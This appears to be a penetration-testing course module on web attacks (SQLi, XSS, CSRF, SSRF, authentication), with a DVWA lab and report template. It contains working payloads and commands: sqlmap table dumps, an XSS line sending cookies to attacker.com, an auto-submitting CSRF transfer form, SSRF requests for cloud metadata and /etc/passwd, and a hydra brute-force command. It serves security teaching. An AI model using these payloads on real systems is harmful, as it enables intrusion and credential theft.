# Module 3: Web Application Attacks

## Objectives
- Identify and exploit OWASP Top 10 vulnerabilities
- Perform SQLi, XSS, CSRF, and SSRF attacks
- Understand authentication/session attacks
- Use Burp Suite for web testing

---

## 3.1 OWASP Top 10

| Rank | Vulnerability | Description |
|------|--------------|-------------|
| A01 | Broken Access Control | Unauthorized resource access |
| A02 | Cryptographic Failures | Weak encryption, data exposure |
| A03 | Injection | SQL, NoSQL, OS command injection |
| A05 | Security Misconfiguration | Default configs, missing patches |
| A07 | Auth Failures | Broken authentication |
| A10 | SSRF | Server-Side Request Forgery |

---

## 3.2 SQL Injection (SQLi)

User input concatenated into SQL queries allows database manipulation.

```sql
-- Vulnerable: SELECT * FROM users WHERE id = '$input'
-- Input: ' OR '1'='1' --
-- Result: SELECT * FROM users WHERE id = '' OR '1'='1' --'
```

### Types
- **Error-based:** Forces DB errors to leak info
- **Union-based:** UNION SELECT to extract other tables
- **Blind:** True/false or time-based inference

```bash
# sqlmap — automated exploitation
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D app_db -T users --dump
```

**Prevention:** Parameterized queries, input validation, least privilege.

---

## 3.3 Cross-Site Scripting (XSS)

Injects malicious scripts into pages viewed by other users.

### Types
- **Reflected:** Payload in URL, reflected in response
- **Stored:** Payload saved in DB, served to all users
- **DOM-based:** Client-side JS processes payload

```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Prevention:** Output encoding, CSP headers, HttpOnly cookies.

---

## 3.4 Cross-Site Request Forgery (CSRF)

Tricks a user's browser into performing unwanted actions on a trusted site.

```html
<!-- On attacker.com — auto-submits to bank.com -->
<form action="https://bank.com/transfer" method="POST" hidden>
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

**Prevention:** Anti-CSRF tokens, SameSite cookies, re-auth for sensitive actions.

---

## 3.5 Server-Side Request Forgery (SSRF)

Tricks the server into fetching internal resources.

```bash
# Attacker targets internal services
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://localhost:8080/admin
http://target.com/fetch?url=file:///etc/passwd
```

**Impact:** Cloud metadata access, internal scanning, local file reading.

**Prevention:** Allowlist domains, disable file:// scheme, network segmentation.

---

## 3.6 Authentication Attacks

- **Credential stuffing** — leaked username/password pairs
- **Password spraying** — one common password against many accounts
- **Session hijacking** — steal cookies via XSS or sniffing

```bash
hydra -l admin -P rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Prevention:** MFA, rate limiting, strong password policies.

---

## 3.7 Lab: Web App Exploitation

### Tasks
1. Configure Burp Suite as browser proxy
2. **SQLi:** Extract usernames/passwords from DVWA
3. **XSS:** Execute stored XSS to capture cookies
4. **CSRF:** Craft a page that changes admin password
5. **Command Injection:** Execute OS commands via DVWA

Start at Low security, progress to Medium/High for bypass practice.

---

## 3.8 Module 3 Report (3–4 pages)

1. Executive summary with risk ratings
2. Each vulnerability: description, CVSS, steps to reproduce, PoC, remediation
3. Attack chain showing how vulnerabilities combine
4. Prioritized remediation plan
